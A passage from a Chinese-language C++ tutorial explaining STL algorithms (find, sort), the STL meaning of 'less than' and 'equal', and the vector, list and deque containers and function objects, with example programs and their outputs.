<p>第 11 行，要查找的区间是 [v.begin(), v.end( ))，v.end() 不在查找范围内，因此没有问题。本行的查找会成功，因此 p 指向找到的元素 3。</p>
<p>第 17 行，因为要查找的区间是 [v.begin()+l，v.end()-1)，这个区间中只有 2、3 这两个元素，因此查找会失败，p 的值变为 v.end() - 1，因此 p 正好指向 4 这个元素。</p>
<p>第 19 行，数组 a 是一个容器。数组名 a 的类型是 int <em>，可以做迭代器使用，表达式<code>a+4</code>的类型也是 int</em>，因此也能做迭代器。本次调用 find,查找区间是 [a, a+4)，即数组 a 的前 4 个元素。如果查找失败，find 就会返回 a+4。</p>
<p>STL 中还有一个常用的算法 sort，用于对容器排序，其原型为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;class_RandIt&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(_RandIt first, _RandIt last)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该算法可以用来对区间 [first, last) 从小到大进行排序。下面两行程序就能对数组 a 排序：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">sort(a, a+<span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<h4 id="STL中-”大“、”小“-和-”相等“-的概念"><a href="#STL中-”大“、”小“-和-”相等“-的概念" class="headerlink" title="STL中 ”大“、”小“ 和 ”相等“ 的概念"></a>STL中 ”大“、”小“ 和 ”相等“ 的概念</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 中关联容器内部的元素是排序的。STL 中的许多算法也涉及排序、查找。这些容器和算法都需要对元素进行比较，有的比较是否相等，有的比较元素大小。</p>
<p>在 STL 中，默认情况下，比较大小是通过<code>&lt;</code>运算符进行的，和<code>&gt;</code>运算符无关。在STL中提到“大”、“小”的概念时，以下三个说法是等价的：</p>
<ul>
<li>x 比 y 小。</li>
<li>表达式<code>x&lt;y</code>为真。</li>
<li>y 比 x 大。</li>
</ul>
<p>一定要注意，<code>y比x大</code>意味着<code>x&lt;y为真</code>，而不是<code>y&gt;x为真</code>。<code>y&gt;x</code>的结果如何并不重要，甚至<code>y&gt;x</code>是没定义的都没有关系。</p>
<p>在 STL 中，<code>x和y相等</code>也往往不等价于<code>x==y为真</code>。对于在未排序的区间上进行的算法，如顺序查找算法 find，查找过程中比较两个元素是否相等用的是<code>==</code>运算符；但是对于在排好序的区间上进行查找、合并等操作的算法（如折半查找算法 binary_search，关联容器自身的成员函数 find）来说，<code>x和y相等</code>是与<code>x&lt;y和y&lt;x同时为假</code>等价的，与<code>==</code>运算符无关。看上去<code>x&lt;y和y&lt;x同时为假</code>就应该和<code>x==y为真</code>等价，其实不然。例如下面的 class A：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt; (<span class="keyword">const</span> A &amp; a)<span class="keyword">const</span> &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到，对任意两个类 A 的对象 x、y，<code>x&lt;y</code>和<code>y&lt;x</code>都是为假的。也就是说，对 STL 的关联容器和许多算法来说，任意两个类 A 的对象都是相等的，这与<code>==</code>运算符的行为无关。</p>
<p>综上所述，使用 STL 中的关联容器和许多算法时，往往需要对<code>&lt;</code>运算符进行适当的重载，使得这些容器和算法可以用<code>&lt;</code>运算符对所操作的元素进行比较。最好将<code>&lt;</code>运算符重载为全局函数，因为在重载为成员函数时，在有些编译器上会出错（由其 STL 源代码的写法导致）。</p>
<h4 id="C-vector，STL-vector（可变长的动态数组）详解"><a href="#C-vector，STL-vector（可变长的动态数组）详解" class="headerlink" title="C++ vector，STL vector（可变长的动态数组）详解"></a>C++ vector，STL vector（可变长的动态数组）详解</h4><p>vector 是顺序容器的一种。vector 是可变长的动态数组，支持随机访问迭代器，所有 <a href="http://c.biancheng.net/stl/">STL</a> 算法都能对 vector 进行操作。要使用 vector，需要包含头文件 vector。</p>
<p>在 vector 容器中，根据下标随机访问某个元素的时间是常数，在尾部添加一个元素的时间大多数情况下也是常数，总体来说速度很快。</p>
<p>在中间插入或删除元素时，因为要移动多个元素，因此速度较慢，平均花费的时间和容器中的元素个数成正比。</p>
<p>在 vector 容器中，用一个动态分配的数组来存放元素，因此根据下标访问某个元素的时间是固定的，与元素个数无关。</p>
<p>vector 容器在实现时，动态分配的存储空间一般都大于存放元素所需的空间。例如，哪怕容器中只有一个元素，也会分配 32 个元素的存储空间。这样做的好处是，在尾部添加一个新元素时不必重新分配空间，直接将新元素写入适当位置即可。在这种情况下，添加新元素的时间也是常数。</p>
<p>但是，如果不断添加新元素，多出来的空间就会用完，此时再添加新元素，就不得不重新分配内存空间，把原有内容复制过去后再添加新的元素。碰到这种情况，添加新元素所花的时间就不是常数，而是和数组中的元素个数成正比。</p>
<p>至于在中间插入或删除元素，必然涉及元素的移动，因此时间不是固定的，而是和元素个数有关。</p>
<p>vector 有很多成员函数，常用的如表 1 所示。</p>
<table>
<thead>
<tr>
<th>成员函数</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td>vector()</td>
<td>无参构造函数，将容器初始化为空</td>
</tr>
<tr>
<td>vector(int n)</td>
<td>将容器初始化为有 n 个元素</td>
</tr>
<tr>
<td>vector(int n, const T &amp; val)</td>
<td>假定元素的类型是 T，此构造函数将容器初始化为有 n 个元素，每 个元素的值都是 val</td>
</tr>
<tr>
<td>vector(iterator first, iterator last)</td>
<td>first 和 last 可以是其他容器的迭代器。一般来说，本构造函数初始化的结果就是将 vector 容器的内容变成与其他容器上的区间 [first, last) —致</td>
</tr>
<tr>
<td>void clear()</td>
<td>删除所有元素</td>
</tr>
<tr>
<td>bool empty()</td>
<td>判断容器是否为空</td>
</tr>
<tr>
<td>void pop_back()</td>
<td>删除容器末尾的元素</td>
</tr>
<tr>
<td>void push_back( const T &amp; val)</td>
<td>将 val 添加到容器末尾</td>
</tr>
<tr>
<td>int size()</td>
<td>返回容器中元素的个数</td>
</tr>
<tr>
<td>T &amp; front()</td>
<td>返回容器中第一个元素的引用</td>
</tr>
<tr>
<td>T &amp; back()</td>
<td>返回容器中最后一个元素的引用</td>
</tr>
<tr>
<td>iterator insert(iterator i, const T &amp; val)</td>
<td>将 val 插入迭代器 i 指向的位置，返回 i</td>
</tr>
<tr>
<td>iterator insert( iterator i, iterator first, iterator last)</td>
<td>将其他容器上的区间 [first, last) 中的元素插入迭代器 i 指向的位置</td>
</tr>
<tr>
<td>iterator erase(iterator i)</td>
<td>删除迭代器 i 指向的元素，返回值是被删元素后面的元素的迭代器</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last)</td>
<td>删除容器中的区间 [first, last)</td>
</tr>
<tr>
<td>void swap( vector <T> &amp; v)</T></td>
<td>将容器自身的内容和另一个同类型的容器 v 互换</td>
</tr>
</tbody></table>
<p>下面的程序演示了 vector 的基本用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;  //使用vector需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">PrintVector</span>(<span class="title">const</span> <span class="title">vector</span> &lt;T&gt; &amp; <span class="title">v</span>)</span></span><br><span class="line"><span class="class">&#123;</span>  <span class="comment">//用于输出vector容器的全部元素的函数模板</span></span><br><span class="line">    <span class="keyword">typename</span> <span class="built_in">vector</span> &lt;T&gt;::const_iterator i;</span><br><span class="line">    <span class="comment">//typename 用来说明 vector &lt;T&gt;::const_iterator 是一个类型，在 Visual Studio 中不写也可以</span></span><br><span class="line">    <span class="keyword">for</span> (i = v.begin(); i != v.end(); ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v(a, a + <span class="number">5</span>);  <span class="comment">//将数组a的内容放入v</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; v.end() - v.begin() &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//两个随机迭代器可以相减，输出：1)5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; PrintVector(v);  <span class="comment">//输出：2)1 2 3 4 5</span></span><br><span class="line">    v.insert(v.begin() + <span class="number">2</span>, <span class="number">13</span>);  <span class="comment">//在 begin()+2 位置插人 13</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; PrintVector(v);  <span class="comment">//输出：3)1 2 13 3 4 5</span></span><br><span class="line">    v.erase(v.begin() + <span class="number">2</span>);  <span class="comment">//删除位于 begin()+2 位置的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; PrintVector(v);  <span class="comment">//输出：4)1 2 3 4 5</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v2</span><span class="params">(<span class="number">4</span>, <span class="number">100</span>)</span></span>;  <span class="comment">//v2 有 4 个元素，都是 100</span></span><br><span class="line">    v2.insert(v2.begin(), v.begin() + <span class="number">1</span>, v.begin() + <span class="number">3</span>);  <span class="comment">//将v的一段插入v2开头</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)v2:&quot;</span>; PrintVector(v2);  <span class="comment">//输出：5)v2:2 3 100 100 100 100</span></span><br><span class="line">    v.erase(v.begin() + <span class="number">1</span>, v.begin() + <span class="number">3</span>);  <span class="comment">//删除 v 上的一个区间，即 [2,3)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; PrintVector(v);  <span class="comment">//输出：6)1 4 5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思考题：程序中的 PrintVector 模板演示了将容器的引用作为函数参数的用法。就完成输出整个容器内容这个功能来说，写成 PrintVector 模板这样是比较笨拙的，该模板的适用范围太窄。有没有更好的写法？</p>
<p>vector 还可以嵌套以形成可变长的<a href="http://c.biancheng.net/c/array/">二维数组</a>。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">v</span><span class="params">(<span class="number">3</span>)</span></span>; <span class="comment">//v有3个元素，每个元素都是vector&lt;int&gt; 容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size(); ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">            v[i].push_back(j);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; v[i].size(); ++j)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; v[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：<br>0 1 2 3<br>0 1 2 3<br>0 1 2 3</p>
<p><code>vector&lt; vector&lt;int&gt; &gt; v(3);</code>定义了一个 vector 容器，该容器中的每个元素都是一个 vector <int> 容器。即可以认为，v 是一个二维数组，一共 3 行，每行都是一个可变长的一维数组。</int></p>
<p>在 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 中，上面写法中 int 后面的两个<code>&gt;</code>之间需要有空格，否则有的编译器会把它们当作<code>&gt;&gt;</code>运算符，编译会出错。</p>
<h4 id="C-list，STL-list（双向链表）详解"><a href="#C-list，STL-list（双向链表）详解" class="headerlink" title="C++ list，STL list（双向链表）详解"></a>C++ list，STL list（双向链表）详解</h4><p>list 是顺序容器的一种。list 是一个双向链表。使用 list 需要包含头文件 list。双向链表的每个元素中都有一个<a href="http://c.biancheng.net/c/80/">指针</a>指向后一个元素，也有一个指针指向前一个元素，如图1所示。</p>
<p>在 list 容器中，在已经定位到要增删元素的位置的情况下，增删元素能在常数时间内完成。如图2所示，在 ai 和 ai+1 之间插入一个元素，只需要修改 ai 和 ai+1 中的指针即可。</p>
<p><img src="/2020/10/30/STL/1-1PZ615050J37.jpg" alt="img"><br>图1 ：双向链表</p>
<p><img src="/2020/10/30/STL/1-1PZ61505142A.jpg" alt="img"><br>图2：在双向链表中插入元素</p>
<p>list 容器不支持根据下标随机存取元素。</p>
<p>list 的构造函数和许多成员函数的用法都与 vector 类似，此处不再列举。除了顺序容器都有的成员函数外，list 容器还独有如表 1 所示的成员函数（此表不包含全部成员函数，且有些函数的参数较为复杂，表中只列出函数名）。</p>
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody><tr>
<td>void push_front(const T &amp; val)</td>
<td>将 val 插入链表最前面</td>
</tr>
<tr>
<td>void pop_front()</td>
<td>删除链表最前面的元素</td>
</tr>
<tr>
<td>void sort()</td>
<td>将链表从小到大排序</td>
</tr>
<tr>
<td>void remove (const T &amp; val)</td>
<td>删除和 val 相等的元素</td>
</tr>
<tr>
<td>remove_if</td>
<td>删除符合某种条件的元素</td>
</tr>
<tr>
<td>void unique()</td>
<td>删除所有和前一个元素相等的元素</td>
</tr>
<tr>
<td>void merge(list <T> &amp; x)</T></td>
<td>将链表 x 合并进来并清空 x。要求链表自身和 x 都是有序的</td>
</tr>
<tr>
<td>void splice(iterator i, list <T> &amp; x, iterator first, iterator last)</T></td>
<td>在位置 i 前面插入链表 x 中的区间 [first, last)，并在链表 x 中删除该区间。链表自身和链表 x 可以是同一个链表，只要 i 不在 [first, last) 中即可</td>
</tr>
</tbody></table>
<p>表1中列出的成员函数有些是重载的，如 unique、merge、splice 成员函数都不止一个， 这里不再一一列举并解释。后面对于其他容器以及算法的介绍，对于有重载的情况也不再指出。要详细了解 <a href="http://c.biancheng.net/stl/">STL</a>，还需要查阅专门的 STL 手册，或查看编译器提供的联机帮助。</p>
<p>STL 中的算法 sort 可以用来对 vector 和 deque 排序，它需要随机访问迭代器的支持。因为 list 不支持随机访问迭代器，所以不能用算法 sort 对 list 容器排序。因此，list 容器引入了 sort 成员函数以完成排序。</p>
<p>list 的示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;  //使用 list 需要包含此头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  //使用STL中的算法需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A(<span class="keyword">int</span> n_) &#123; n = n_; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2);</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2);</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2) &#123;</span><br><span class="line">    <span class="keyword">return</span> a1.n &lt; a2.n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2) &#123;</span><br><span class="line">    <span class="keyword">return</span> a1.n == a2.n;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a) &#123;</span><br><span class="line">    o &lt;&lt; a.n;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Print</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span> &#125;;</span><br><span class="line">    A b[<span class="number">7</span>] = &#123; <span class="number">10</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">40</span> &#125;;</span><br><span class="line">    list&lt;A&gt; lst1(a, a + 5), lst2(b, b + 7);</span><br><span class="line">    lst1.sort();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：1)1 2 2 3 4</span></span><br><span class="line">    lst1.remove(<span class="number">2</span>);  <span class="comment">//删除所有和A(2)相等的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：2)1 3 4</span></span><br><span class="line">    lst2.pop_front();  <span class="comment">//删除第一个元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：3)30 20 30 30 40 40</span></span><br><span class="line">    lst2.unique();  <span class="comment">//删除所有和前一个元素相等的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：4)30 20 30 40</span></span><br><span class="line">    lst2.sort();</span><br><span class="line">    lst1.merge(lst2);  <span class="comment">//合并 lst2 到 lst1 并清空 lst2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：5)1 3 4 20 30 30 40</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//lst2是空的，输出：6)</span></span><br><span class="line">    lst1.reverse();  <span class="comment">//将 lst1 前后颠倒</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;7)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出 7)40 30 30 20 4 3 1</span></span><br><span class="line">    lst2.insert(lst2.begin(), a + <span class="number">1</span>, a + <span class="number">4</span>);  <span class="comment">//在 lst2 中插入 3,2,4 三个元素</span></span><br><span class="line">    <span class="built_in">list</span> &lt;A&gt;::iterator p1, p2, p3;</span><br><span class="line">    p1 = find(lst1.begin(), lst1.end(), <span class="number">30</span>);</span><br><span class="line">    p2 = find(lst2.begin(), lst2.end(), <span class="number">2</span>);</span><br><span class="line">    p3 = find(lst2.begin(), lst2.end(), <span class="number">4</span>);</span><br><span class="line">    lst1.splice(p1, lst2, p2, p3);  <span class="comment">//将[p2, p3)插入p1之前，并从 lst2 中删除[p2,p3)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;8)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：8)40 2 30 30 20 4 3 1</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：9)3 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>【实例】用 list 解决约瑟夫问题。</p>
<p>约瑟夫问题是：有 n 只猴子，按顺时针方向围成一圈选大王（编号为 1~n），从第 1 号开始报数，一直数到 m，数到 m 的猴子退到圈外，剩下的猴子再接着从 1 开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王。编程求输入 n、m 后,输出最后猴王的编号。</p>
<p>输入数据：每行是用空格分开的两个整数，第一个是 n，第二个是 m（0&lt;m, n&lt;=1 000 000）。最后一行是：<br>0 0</p>
<p>输出要求：对于每行输入数据（最后一行除外），输出数据也是一行，即最后猴王的编号。</p>
<p>输入样例：<br>6 2<br>12 4<br>8 3<br>0 0</p>
<p>输出样例：<br>5<br>1<br>7</p>
<p>示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; monkeys;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        monkeys.clear();  <span class="comment">//清空list容器</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)  <span class="comment">//将猴子的编号放入list</span></span><br><span class="line">            monkeys.push_back(i);</span><br><span class="line">        <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator it = monkeys.begin();</span><br><span class="line">        <span class="keyword">while</span> (monkeys.size() &gt; <span class="number">1</span>) &#123; <span class="comment">//只要还有不止一只猴子，就要找一只猴子让其出列</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123; <span class="comment">//报数</span></span><br><span class="line">                ++it;</span><br><span class="line">                <span class="keyword">if</span> (it == monkeys.end())</span><br><span class="line">                    it = monkeys.begin();</span><br><span class="line">            &#125;</span><br><span class="line">            it = monkeys.erase(it); <span class="comment">//删除元素后，迭代器失效，</span></span><br><span class="line">                                    <span class="comment">//要重新让迭代器指向被删元素的后面</span></span><br><span class="line">            <span class="keyword">if</span> (it == monkeys.end())</span><br><span class="line">                it = monkeys.begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; monkeys.front() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//front返回第一个元素的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>erase 成员函数返回被删除元素后面那个元素的迭代器。如果被删除的是最后一个元素，则返回 end()。</p>
<p>这个程序也可以用 vector 实现，但是执行速度要慢很多。因为 vector 的 erase 操作牵涉元素的移动，不能在常数时间内完成，所花费的时间和容器中的元素个数有关；而 list 的 erase 操作只是修改几个指针而已，可以在常数时间内完成。当 n 很大（数十万）时，两种写法在速度上会有明显区别。</p>
<h4 id="C-deque，STL-deque（双向队列详解）"><a href="#C-deque，STL-deque（双向队列详解）" class="headerlink" title="C++ deque，STL deque（双向队列详解）"></a>C++ deque，STL deque（双向队列详解）</h4><p>deque 也是顺序容器的一种，同时也是一个可变长数组。要使用 deque，需要包含头文件 deque。所有适用于 vector 的操作都适用于 deque。</p>
<p>deque 和 <a href="http://c.biancheng.net/view/348.html">vector</a> 有很多类似的地方。在 deque 中，随机存取任何元素都能在常数时间内完成（但慢于vector）。它相比于 vector 的优点是，vector 在头部删除或添加元素的速度很慢，在尾部添加元素的性能较好，而 deque 在头尾增删元素都具有较好的性能（大多数情况下都能在常数时间内完成）。它有两种 vector 没有的成员函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_front</span> <span class="params">(<span class="keyword">const</span> T &amp; val)</span></span>; <span class="comment">//将 val 插入容器的头部</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop_front</span><span class="params">()</span></span>; <span class="comment">//删除容器头部的元素</span></span><br></pre></td></tr></table></figure>


<p>思考题：猜想一下，deque 是如何实现它相比 vector 的优势的？</p>
<h4 id="C-函数对象详解（附带实例）"><a href="#C-函数对象详解（附带实例）" class="headerlink" title="C++函数对象详解（附带实例）"></a>C++函数对象详解（附带实例）</h4><p>如果一个类将<code>()</code>运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象。函数对象是一个对象，但是使用的形式看起来像函数调用，实际上也执行了函数调用，因而得名。</p>
<p>下面是一个函数对象的例子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CAverage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="comment">//重载()运算符</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">double</span>)(a1 + a2 + a3) / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CAverage average;  <span class="comment">//能够求三个整数平均数的函数对象</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; average(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">//等价于 cout &lt;&lt; average.operator(3, 2, 3);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：</p>
<ol start="2">
<li>66667</li>
</ol>
